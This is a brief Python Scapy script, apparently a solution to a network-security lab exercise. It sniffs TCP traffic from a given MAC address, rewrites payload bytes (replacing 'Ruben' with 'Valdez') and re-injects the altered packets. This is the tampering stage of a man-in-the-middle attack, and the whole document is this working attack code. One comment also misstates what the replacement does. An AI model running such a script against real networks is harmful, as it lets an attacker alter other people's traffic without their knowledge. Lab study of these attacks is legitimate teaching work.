#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
# Create a new IP packet based on the intercepted packet
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)       # Delete checksums so Scapy recalculates them
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print(f"*** %s, length: %d" % (data, len(data)))

        # Replace occurrences of your first name with 'A's
        newdata = data.replace(b'Ruben', b'Valdez')

        # Send the modified packet
        send(newpkt/newdata)
    
    else:
        send(newpkt)

# Filter for TCP packets on the specified interface (eth0)
f = 'tcp and ether src 02:42:0a:09:00:05'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

